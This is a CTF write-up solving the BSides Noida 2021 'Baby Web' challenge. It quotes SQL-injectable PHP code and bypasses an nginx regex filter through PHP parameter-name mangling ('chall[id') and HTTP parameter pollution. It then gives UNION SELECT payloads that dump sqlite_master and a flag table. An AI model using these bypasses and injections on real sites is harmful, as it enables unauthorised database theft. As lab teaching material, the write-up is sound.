# Baby Web 420 points

# Description
Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD
Note : Bruteforce is not required.

[chall link](http://ctf.babyweb.bsidesnoida.in/)

# Attachments
[sauce](https://github.com/MikelAcker/CTF_WRITEUPS_2021/blob/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/baby_web.zip?raw=true)

# Solution
### Unintended Solution
After checking the given files, I found out that `karma.db` is placed in the root directory

So, access it and search for the flag

http://ctf.babyweb.bsidesnoida.in/karma.db

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info1.png">

*flag*: `BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`

### Intended Solution
Looking at `index.php`, we can see that the website takes `chall_id` http parameter and passes it's value to "SELECT * FROM ..." query statement.
```php
...

if (isset($_GET['chall_id'])) {
    $channel_name = $_GET['chall_id'];
    $sql = "SELECT * FROM CTF WHERE id={$channel_name}";
    $results = $db->query($sql);

...
```
The parameter's vaule is **unfiltered**.So, we can do *injection* attack.

But, when we send payloads which contains *alphabet*, it gives error.

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info2.png">

Checking carefully the *given* files again, I found that there is a **regex** that is used to prevent alphabets and white spaces in `chall_id` from `config/ctf.conf` file
```
...

if ( $arg_chall_id ~ [A-Za-z_.%]){
		return 500;
	}

...
```

We have to think how to *bypass*  it

After searching online, I found this useful article [PHP query string parser vulnerability](https://medium.com/@nyomanpradipta120/php-query-string-parser-vulnerability-cc6f0a8b206)

It says, in php query string parsing process, it removes or replaces some characters in the argument names with underscore.

For example: `post[id=1337` becomes `post_id=1337`

So, in this challenge, if we send `?chall[id`, the regex will see `chall[id` but the php application will see `chall_id`

We can do **injection** now!!!

`http://ctf.babyweb.bsidesnoida.in/?chall[id=1+or+1=1`

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info3.png>

From opening given `karma.db` file, we can see that there are 6 *columns*.
```
$ cat karma.db
�_�%tableCTFCTFCREATE TABLE CTF(
  id integer AUTO_INCREMENT,
  title varchar(255) not NULL,
  description varchar(255) not NULL,
  category varchar(255) not NULL,
  author varchar(255) not NULL,
  points int NOT NULL
B��
...
```

Now, we can use **UNION SELECT** payload

`http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,6`

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info4.png">

We can extract all the **tables** from **sqlite_master**

`http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,sql+from+sqlite_master`

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info5.png">

There is a *table* **flagsss** and a column **flag** in it

Let's see if the flag is there

`http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,flag+from+flagsss`

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info6.png">

Can't see the whole **flag** so I look at the source

<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info7.png">

And, there is the **flag**

*flag*: `BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`

# Another way to solve

We can use [HTTP Parameter Pollution](https://www.youtube.com/watch?v=QVZBl8yxVX0) to solve this challenge

`http://ctf.babyweb.bsidesnoida.in/?chall_id=1&chall_id=1+union+select+1,2,3,4,5,flag+from+flagsss`

When we send this payload, the **regex** filters the first `chall_id` but not the *last* one.

And also in **php** if there are same *http* parameters it will use only the **last** one

So, we can bypass the **regex** and do the *injection*
